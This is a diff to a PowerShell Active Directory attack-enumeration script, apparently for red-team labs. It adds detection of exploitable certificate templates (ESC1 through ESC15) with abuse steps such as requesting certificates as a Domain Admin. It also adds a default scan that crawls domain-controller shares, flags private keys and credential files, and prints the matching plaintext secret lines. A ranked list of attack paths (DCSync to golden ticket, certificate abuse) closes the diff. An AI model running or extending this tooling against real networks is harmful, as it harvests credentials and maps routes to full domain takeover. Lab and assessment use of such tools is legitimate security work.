@@ -63,7 +63,8 @@ param(
     [string[]]$Only,            # run ONLY sections matching these keywords (e.g. users,acls,delegation)
     [string[]]$Skip,            # skip sections matching these keywords
     [switch]$Zip,               # also zip the whole run folder (easy transfer / reporting)
-    [switch]$Json               # also write findings.json (machine-readable: values + findings)
+    [switch]$Json,              # also write findings.json (machine-readable: values + findings)
+    [string[]]$OwnedPrincipals  # accounts/SIDs you control -> auto-highlight actionable ESC/ACL findings
 )
 
 function Invoke-CRTPEnum {
@@ -88,7 +89,8 @@ function Invoke-CRTPEnum {
         [string[]]$Only,         # run ONLY sections whose keyword(s) match these
         [string[]]$Skip,         # skip sections whose keyword(s) match these
         [switch]$Zip,            # also zip the run folder when done
-        [switch]$Json            # also write findings.json (values + findings, for tooling)
+        [switch]$Json,           # also write findings.json (values + findings, for tooling)
+        [string[]]$OwnedPrincipals = @()  # accounts you control -> highlight actionable ESC/ACL findings
     )
 
     $ErrorActionPreference = 'SilentlyContinue'
@@ -167,9 +169,11 @@ function Invoke-CRTPEnum {
     function Sect($n){ Log "`n[==== $n ====]" 'Cyan' }
     function Flag($sev,$txt){
         $tag = switch($sev){ 'HIGH'{'[HIGH]'} 'MED'{'[MED ]'} default{'[INFO]'} }
-        $summary.Add("$tag $txt")
+        $line = "$tag $txt"
+        if ($summary.Contains($line)){ return }   # de-dup identical findings (kills PowerUp/duplicate-ACE spam)
+        $summary.Add($line)
         $col = switch($sev){ 'HIGH'{'Red'} 'MED'{'Yellow'} default{'DarkGray'} }
-        Log "$tag $txt" $col
+        Log $line $col
     }
     function Save($file,$data){ $data | Out-File -FilePath (Join-Path $run $file) -Encoding UTF8 -Width 4096 }
 
@@ -419,9 +423,14 @@ function Invoke-CRTPEnum {
     $out = @()
     try {
         if ($useAD) {
-            $comps = Get-ADComputer -Filter * -Server $Domain -Properties `
-                OperatingSystem,trustedForDelegation,'msDS-AllowedToDelegateTo',`
-                'msDS-AllowedToActOnBehalfOfOtherIdentity','ms-Mcs-AdmPwd',servicePrincipalName,userAccountControl
+            # Only request ms-Mcs-AdmPwd if the LAPS attribute actually exists in the schema.
+            # (Requesting a non-existent property makes Get-ADComputer throw and kills this whole
+            #  section -> all delegation/RBCD enum lost. This was the 03_computers.txt failure.)
+            $lapsAttr = @()
+            try { if (Get-ADObject -SearchBase ((Get-ADRootDSE -Server $Domain).schemaNamingContext) -LDAPFilter '(name=ms-Mcs-AdmPwd)' -Server $Domain -ErrorAction Stop) { $lapsAttr = @('ms-Mcs-AdmPwd') } } catch {}
+            $comps = Get-ADComputer -Filter * -Server $Domain -Properties (@(
+                'OperatingSystem','trustedForDelegation','msDS-AllowedToDelegateTo',
+                'msDS-AllowedToActOnBehalfOfOtherIdentity','servicePrincipalName','userAccountControl') + $lapsAttr)
             if ($Target) { $comps = $comps | Where-Object { $c=$_; @($Target | Where-Object { $c.Name -like "*$_*" -or "$($c.DNSHostName)" -like "*$_*" }).Count -gt 0 } }
             $out += ($comps | Select-Object Name,OperatingSystem,trustedForDelegation | Format-Table -Auto | Out-String)
 
@@ -560,24 +569,79 @@ function Invoke-CRTPEnum {
             }
         } else { $out += "No enterprise CA found via LDAP config partition." ; Flag 'INFO' "No AD CS CA found (or not readable)." }
 
-        # ESC1-style vulnerable template detection (pure LDAP, no Certify needed)
+        # ---- AD CS template ESC detection (pure LDAP: ESC1/2/3/9/13/15 + ESC14) ----
         $tmplBase = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"
-        $tmpls = LDAP '(objectClass=pKICertificateTemplate)' @('name','mspki-certificate-name-flag','mspki-enrollment-flag','pkiextendedkeyusage','mspki-ra-signature') $tmplBase
-        $out += "`n--- TEMPLATE ESC CHECK ---"
-        foreach($tp in $tmpls){
-            $nameFlag = IntP $tp 'mspki-certificate-name-flag'
-            $enrFlag  = IntP $tp 'mspki-enrollment-flag'
-            $raSig    = IntP $tp 'mspki-ra-signature'
-            $ekus     = @($tp.Properties['pkiextendedkeyusage'])
-            $suppliesSubject = ($nameFlag -band 0x1)                 # ENROLLEE_SUPPLIES_SUBJECT
-            $mgrApproval     = ($enrFlag  -band 0x2)                 # PEND_ALL_REQUESTS (manager approval)
-            $authClient = ($ekus.Count -eq 0) -or ($ekus -contains '1.3.6.1.5.5.7.3.2') -or ($ekus -contains '1.3.6.1.4.1.311.20.2.2') -or ($ekus -contains '1.3.6.1.5.2.3.4') -or ($ekus -contains '2.5.29.37.0')
-            if ($suppliesSubject -and (-not $mgrApproval) -and ($raSig -le 0) -and $authClient){
-                Flag 'HIGH' "AD CS ESC1 template: $(PV $tp 'name') (enrollee-supplies-subject + client-auth + no approval) -> verify low-priv enroll rights"
-                AddExpl 'ESC1' @{ Template=(PV $tp 'name') }
-                $out += "ESC1? $(PV $tp 'name')  nameFlag=$nameFlag enrFlag=$enrFlag EKU=$($ekus -join ',')"
-            }
+        $tmpls = LDAP '(objectClass=pKICertificateTemplate)' @('name','distinguishedname','mspki-certificate-name-flag','mspki-enrollment-flag','pkiextendedkeyusage','mspki-certificate-application-policy','mspki-ra-signature','mspki-certificate-policy','mspki-template-schema-version') $tmplBase
+
+        # OID -> privileged-group link map (ESC13)
+        $oidLinks = @{}
+        foreach($o in (LDAP '(objectClass=msPKI-Enterprise-Oid)' @('mspki-cert-template-oid','msds-oidtogrouplink') "LDAP://CN=OID,CN=Public Key Services,CN=Services,$configNC")){
+            $gl = PV $o 'msds-oidtogrouplink'; if ($gl){ $oidLinks[(PV $o 'mspki-cert-template-oid')] = $gl }
         }
+
+        # who can ENROLL in a template (Enrollment / AutoEnrollment extended right, or GenericAll/WriteDacl/WriteOwner)
+        $enrollGuids = @('0e10c968-78fb-11d2-90d4-00c04f79dc55','a05b8cc2-17bc-4802-a710-e7c15ab866a2')
+        $GetEnrollers = {
+            param($dn)
+            $w = @()
+            try {
+                foreach($ace in (DE "LDAP://$dn").ObjectSecurity.Access){
+                    if ($ace.AccessControlType -ne 'Allow'){ continue }
+                    $r = "$($ace.ActiveDirectoryRights)"; $og = "$($ace.ObjectType)"
+                    if ($r -match 'GenericAll|WriteDacl|WriteOwner' -or ($r -match 'ExtendedRight' -and ($enrollGuids -contains $og -or $og -eq '00000000-0000-0000-0000-000000000000'))){
+                        $w += "$($ace.IdentityReference)"
+                    }
+                }
+            } catch {}
+            $w | Sort-Object -Unique
+        }
+        $lowPrivRx = 'Authenticated Users|Domain Users|Domain Computers|Everyone|\\Users$'
+
+        $out += "`n--- TEMPLATE ESC CHECK (ESC1/2/3/9/13/15) ---"
+        foreach($tp in $tmpls){
+            $tname = PV $tp 'name'; $dn = PV $tp 'distinguishedname'
+            $nameFlag = IntP $tp 'mspki-certificate-name-flag'; $enrFlag = IntP $tp 'mspki-enrollment-flag'
+            $raSig = IntP $tp 'mspki-ra-signature'; $schema = IntP $tp 'mspki-template-schema-version'
+            $ekus = @($tp.Properties['pkiextendedkeyusage']) + @($tp.Properties['mspki-certificate-application-policy'])
+            $supplies = ($nameFlag -band 0x1); $mgr = ($enrFlag -band 0x2); $noSec = ($enrFlag -band 0x80000)
+            $clientAuth = ($ekus -contains '1.3.6.1.5.5.7.3.2') -or ($ekus -contains '1.3.6.1.4.1.311.20.2.2') -or ($ekus -contains '1.3.6.1.5.2.3.4')
+            $anyPurpose = ($ekus -contains '2.5.29.37.0'); $noEku = ($ekus.Count -eq 0)
+            $agentEku = ($ekus -contains '1.3.6.1.4.1.311.20.2.1')     # Certificate Request Agent
+            $enrollers = & $GetEnrollers $dn
+            $own = @(); foreach($e in $enrollers){ $short = ($e -replace '^.*\\',''); if (($e -match $lowPrivRx) -or ($OwnedPrincipals -contains $e) -or ($OwnedPrincipals -contains $short)){ $own += $e } }
+            $actionable = ($own.Count -gt 0)
+            $tag = if ($actionable){ 'HIGH' } else { 'INFO' }   # only HIGH if a principal you control can enroll (kills false positives)
+            $enrNote = if ($own){ "enroll: $($own -join ', ')" } elseif ($enrollers){ "enroll(other): $($enrollers -join ', ')" } else { 'enroll: (unreadable)' }
+
+            if ($supplies -and -not $mgr -and $raSig -le 0 -and ($clientAuth -or $anyPurpose -or $noEku)){
+                Flag $tag "AD CS ESC1: $tname (enrollee-supplies-subject + client-auth, $enrNote) -> request a cert with altname of any user"
+                if ($actionable){ AddExpl 'ESC1' @{ Template=$tname; Enroll=($own -join ',') } }
+            }
+            if (($anyPurpose -or $noEku) -and -not $mgr -and $raSig -le 0 -and $actionable){
+                Flag 'HIGH' "AD CS ESC2: $tname (Any-Purpose / No-EKU - usable as an enrollment agent, $enrNote)"
+                AddExpl 'ESC2' @{ Template=$tname; Enroll=($own -join ',') }
+            }
+            if ($agentEku -and -not $mgr){
+                Flag $tag "AD CS ESC3 (AGENT template): $tname has Certificate Request Agent EKU, $enrNote -> mint an enrollment-agent cert"
+                if ($actionable){ AddExpl 'ESC3Agent' @{ Template=$tname; Enroll=($own -join ',') } }
+            }
+            if ($raSig -ge 1 -and $clientAuth){
+                Flag $tag "AD CS ESC3 (TARGET template): $tname requires enrollment-agent signature + client-auth, $enrNote -> enroll ON-BEHALF-OF a privileged user (e.g. a Domain Admin)"
+                if ($actionable){ AddExpl 'ESC3Target' @{ Template=$tname; Enroll=($own -join ',') } }
+            }
+            if ($noSec -and $clientAuth){
+                Flag $tag "AD CS ESC9: $tname has NO_SECURITY_EXTENSION + client-auth (weak cert mapping), $enrNote"
+                if ($actionable){ AddExpl 'ESC9' @{ Template=$tname; Enroll=($own -join ',') } }
+            }
+            foreach($p in @($tp.Properties['mspki-certificate-policy'])){ if ($oidLinks.ContainsKey($p)){ Flag 'HIGH' "AD CS ESC13: $tname issuance policy links to group $($oidLinks[$p]) (enrolling grants that group's membership), $enrNote"; AddExpl 'ESC13' @{ Template=$tname; Group=$oidLinks[$p] } } }
+            if ($schema -eq 1 -and $supplies -and $actionable){ Flag 'MED' "AD CS ESC15: $tname is schema v1 + enrollee-supplies-subject -> inject an application policy (EKU) at request time, $enrNote" }
+
+            $out += "TEMPLATE $tname  schema=$schema nameFlag=$nameFlag enrFlag=$enrFlag raSig=$raSig  EKU=$($ekus -join ',')  $enrNote"
+        }
+        # ESC3 pairing + ESC8 + ESC14 (not all LDAP-detectable)
+        Flag 'INFO' "ESC3 needs BOTH an AGENT template (Request Agent EKU, enrollable) AND a TARGET template (raSig>=1 + client-auth). If both are flagged + enrollable above, chain them: agent cert -> request /onbehalfof:<DA> on the target."
+        Flag 'INFO' "ESC8: manually test http(s)://<CA-host>/certsrv/ , /certsrv/certfnsh.asp , /certsrv/mscep/ for NTLM web-enrollment (coerce a machine acct + relay -> cert as that machine)."
+        foreach($r in (LDAP '(altSecurityIdentities=*)' @('samaccountname','altsecurityidentities'))){ Flag 'HIGH' "ESC14 / explicit cert mapping: $(PV $r 'samaccountname') <- $(PV $r 'altsecurityidentities') (a matching certificate authenticates AS this account)" }
     } catch { $out += "Error: $_" }
     Save '06_adcs.txt' $out
     }
@@ -822,7 +886,67 @@ function Invoke-CRTPEnum {
         } catch { $out += "Error: $_" }
         Save '12_shares.txt' $out
     } elseif (-not $Quick) {
-        Flag 'INFO' "Share hunt skipped (host-touching = loud). Enable with -HostSweep or scope with -Target."
+        Flag 'INFO' "Domain-wide share hunt skipped (loud). Enable with -HostSweep. (DC/target secret scan still runs below.)"
+    }
+
+    # ---------------- 12b DC + target SHARE/SECRET scan (DEFAULT, low-noise: DC(s) + -Target only) ----------------
+    # Catches credential-in-share leaks (e.g. a plaintext pwd in a maintenance script, or a .pem/.pfx
+    # private key on a readable share) generically - the class that both lab footholds came from.
+    # Only touches the domain's DC(s) + any -Target host, so it's low-noise (uses the current token).
+    if (-not $Quick -and (RunS @('shares','secrets','files'))) {
+        Sect "Share secret scan (DC(s) + targets: non-default readable shares, *.pem/*.pfx/creds)"
+        $out = @()
+        try {
+            $scanHosts = @()
+            foreach($r in (LDAP '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))' @('dnshostname'))){ $dh = PV $r 'dnshostname'; if ($dh){ $scanHosts += $dh } }
+            if (-not $scanHosts){ $scanHosts += $Domain }
+            if ($Target){ $scanHosts += $Target }
+            $scanHosts = $scanHosts | Sort-Object -Unique
+
+            $skipShare = 'ADMIN\$|^C\$|^D\$|^E\$|IPC\$|PRINT\$|^NETLOGON$'   # default/admin shares (SYSVOL handled in 05_gpo)
+            $keyExt    = '\.pem$|\.pfx$|\.p12$|\.key$|\.ppk$|id_rsa|\.kdbx$'  # private keys / credential stores -> HIGH
+            $nameHit   = '\.pem$|\.pfx$|\.p12$|\.key$|\.ppk$|id_rsa|\.kdbx$|pass|cred|secret|unattend|\.config$|\.vmdk$|\.rdp$'
+            $bodyHit   = 'password|passwd|pwd\s*[:=]|cpassword|AsPlainText|ConvertTo-SecureString|-AsPlainText|BEGIN (RSA |EC |)PRIVATE KEY|net user |secretkey|apikey|connectionstring'
+            $textExt   = '\.(ps1|psm1|bat|cmd|vbs|xml|ini|config|conf|cnf|txt|json|yml|yaml|pem|key|ps1xml)$'
+
+            foreach($h in $scanHosts){
+                $shares = @()
+                try { foreach($ln in (net view "\\$h" /all 2>$null)){ if ($ln -match '^(\S.*?)\s{2,}Disk'){ $shares += $Matches[1].Trim() } } } catch {}
+                foreach($sh in $shares){
+                    if ($sh -match $skipShare){ continue }
+                    $unc = "\\$h\$sh"
+                    $ok = $false; try { $ok = Test-Path -LiteralPath $unc -ErrorAction SilentlyContinue } catch {}
+                    if (-not $ok){ continue }
+                    Flag 'MED' "Readable non-default share: $unc -> review for secrets/keys"
+                    $out += "SHARE $unc"
+                    try {
+                        $items = @(Get-ChildItem -LiteralPath $unc -Recurse -File -ErrorAction SilentlyContinue | Select-Object -First 500)
+                        foreach($it in $items){
+                            $out += "  $($it.FullName)  [$($it.Length)b]"
+                            if ($it.Name -match $keyExt){
+                                Flag 'HIGH' "Private key / credential file on share: $($it.FullName) -> may allow PKINIT / direct authentication"
+                                AddExpl 'ShareSecretFile' @{ File=$it.FullName }
+                            } elseif ($it.Name -match $nameHit){
+                                Flag 'MED' "Interesting file on share: $($it.FullName)"
+                            }
+                            if ($it.Length -lt 524288 -and $it.Extension -match $textExt){
+                                try {
+                                    $txt = Get-Content -LiteralPath $it.FullName -Raw -ErrorAction SilentlyContinue
+                                    if ($txt -and $txt -match $bodyHit){
+                                        $line = ($txt -split "`r?`n" | Where-Object { $_ -match $bodyHit } | Select-Object -First 1)
+                                        Flag 'HIGH' "Secret in share file $($it.FullName): $(([string]$line).Trim())"
+                                        AddExpl 'ShareSecret' @{ File=$it.FullName }
+                                    }
+                                } catch {}
+                            }
+                        }
+                    } catch {}
+                }
+            }
+            if (-not $out){ $out += "No non-default readable shares found on: $($scanHosts -join ', ')  (try -HostSweep for a domain-wide sweep)" }
+            else { $out += "`n(Tip: for a full domain-wide share sweep, run with -HostSweep.)" }
+        } catch { $out += "Error: $_" }
+        Save '12b_share_secrets.txt' $out
     }
 
     # ---------------- 13 LOCAL PRIVILEGE ESCALATION (this host) ----------------
@@ -1193,7 +1317,14 @@ function Invoke-CRTPEnum {
     # RECOMMENDED NEXT MOVE  (answers "what attack path should I investigate next?")
     $prio = @(
         @{t='DCSync';                     why='DCSync rights -> dump krbtgt -> golden ticket = full domain'},
-        @{t='ESC1';                       why='AD CS ESC1 -> request a cert AS Domain Admin'},
+        @{t='ShareSecretFile';            why='private key / credential file on a readable share -> PKINIT / direct auth'},
+        @{t='ShareSecret';                why='credential/secret in a readable share file -> use it directly'},
+        @{t='ESC3Target';                 why='AD CS ESC3 -> enroll an agent cert, then request a cert ON-BEHALF-OF a Domain Admin -> DA'},
+        @{t='ESC3Agent';                  why='AD CS ESC3 (agent template enrollable) -> pair with an ESC3 TARGET template to impersonate a DA'},
+        @{t='ESC13';                      why='AD CS ESC13 -> issuance policy links to a privileged group -> enroll to inherit it'},
+        @{t='ESC1';                       why='AD CS ESC1 -> request a cert with altSubject = Domain Admin'},
+        @{t='ESC2';                       why='AD CS ESC2 (any-purpose / SubCA) -> use as enrollment agent / any-purpose cert'},
+        @{t='ESC9';                       why='AD CS ESC9 (no security extension) -> weak cert mapping to a privileged account'},
         @{t='LAPS';                       why='readable LAPS password -> local admin right now'},
         @{t='GMSA';                       why='readable gMSA -> use its NTLM (overpass-the-hash)'},
         @{t='GPP';                        why='GPP cpassword -> decrypt a stored credential'},
@@ -1873,7 +2004,8 @@ tr.hi{background:#2d1416}tr:hover{background:#161b22}
             '08_localadmin'       = 'Hosts where you have local admin'
             '09_spns'             = 'Domain SPN inventory'
             '10_mssql'            = 'MSSQL SPNs'
-            '12_shares'           = 'Readable shares + interesting files'
+            '12_shares'           = 'Readable shares + interesting files (domain-wide; -HostSweep)'
+            '12b_share_secrets'   = 'DC/target non-default shares + secret/key files (default scan)'
             '13_local_privesc'    = 'PowerUp/PrivEscCheck local privesc + cached GPP'
             '13b_winpeas'         = 'winPEAS deep local triage (opt-in)'
             '14_attack_paths'     = 'Admin x privileged-session correlation (GO HERE)'
